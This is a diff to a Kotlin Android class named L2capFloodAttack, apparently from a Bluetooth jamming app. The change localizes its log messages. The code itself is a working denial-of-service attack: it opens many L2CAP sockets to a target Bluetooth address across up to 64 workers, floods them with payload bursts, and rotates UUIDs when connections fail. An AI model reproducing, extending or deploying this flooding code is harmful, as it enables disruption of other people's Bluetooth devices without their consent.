@@ -7,6 +7,7 @@ import android.bluetooth.BluetoothManager
 import android.bluetooth.BluetoothSocket
 import android.content.Context
 import androidx.core.content.ContextCompat.getSystemService
+import com.eikarna.bluetoothjammer.R
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.SupervisorJob
@@ -32,8 +33,11 @@ class L2capFloodAttack(
     private val bombard: Boolean = false
 ) : BluetoothAttack {
 
-    override val displayName = AttackType.L2CAP_FLOOD.displayName
-    override val description = AttackType.L2CAP_FLOOD.description
+    private var appContext: Context? = null
+    override val displayName: String
+        get() = appContext?.getString(AttackType.L2CAP_FLOOD.labelRes) ?: AttackType.L2CAP_FLOOD.fallbackLabel
+    override val description: String
+        get() = appContext?.getString(AttackType.L2CAP_FLOOD.descRes) ?: AttackType.L2CAP_FLOOD.fallbackDesc
 
     private var bluetoothAdapter: BluetoothAdapter? = null
     private val sockets = Collections.synchronizedList(mutableListOf<BluetoothSocket>())
@@ -47,6 +51,7 @@ class L2capFloodAttack(
     override fun start(context: Context, onLog: (String) -> Unit) {
         if (running) return
         running = true
+        appContext = context.applicationContext
         bluetoothAdapter = getSystemService(context, BluetoothManager::class.java)?.adapter
         val device: BluetoothDevice? = bluetoothAdapter?.getRemoteDevice(targetAddress)
         if (device == null) {
@@ -56,7 +61,7 @@ class L2capFloodAttack(
 
         val workerCount = threads.coerceIn(1, 64)
         scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
-        onLog("[THREAD] L2CAP Flood iniciado (objetivo $targetAddress, $workerCount worker(s))")
+        onLog(context.getString(R.string.log_l2cap_started, targetAddress, workerCount))
 
         repeat(workerCount) { worker ->
             scope!!.launch {
@@ -74,13 +79,13 @@ class L2capFloodAttack(
                                 // Bombard: one burst then close, cycle fast
                                 val size = if (payloadSize > 0) payloadSize else 600
                                 socket.outputStream.write(payloadPattern.buffer(size))
-                                onLog("[$worker][DATA] Ráfaga enviada (bombardeo)")
+                                onLog("[$worker][DATA] " + context.getString(R.string.log_bombard_burst))
                                 runCatching { socket.close() }
                                 jitterDelay(maxOf(50, rateDelayMs))
                             } else {
                                 sockets.add(socket)
-                                onLog("[$worker][CONN] Conexión establecida (UUID $uuid)")
-                                FloodSupport.flood(socket, payloadPattern, payloadSize, rateDelayMs, { running }, onLog, "$worker")
+                                onLog("[$worker][CONN] " + context.getString(R.string.log_l2cap_connected, uuid))
+                                FloodSupport.flood(context, socket, payloadPattern, payloadSize, rateDelayMs, { running }, onLog, "$worker")
                                 sockets.remove(socket)
                                 break
                             }
@@ -90,16 +95,12 @@ class L2capFloodAttack(
                         successfulUUID = UUID.fromString(
                             UUID.randomUUID().toString().split("-")[0] + "-0000-1000-8000-00805F9B34FB"
                         )
-                        if (isActive && running) onLog("[$worker][RETRY] Intento fallido, UUID rotado")
+                        if (isActive && running) onLog("[$worker][RETRY] " + context.getString(R.string.log_l2cap_retry))
                         jitterDelay(maxOf(100, rateDelayMs))
                     }
                 }
             }
         }
-    }
-
-    private suspend fun floodSocket(socket: BluetoothSocket, onLog: (String) -> Unit, worker: Int) {
-        FloodSupport.flood(socket, payloadPattern, payloadSize, rateDelayMs, { running }, onLog, "$worker")
     }
 
     override fun stop() {
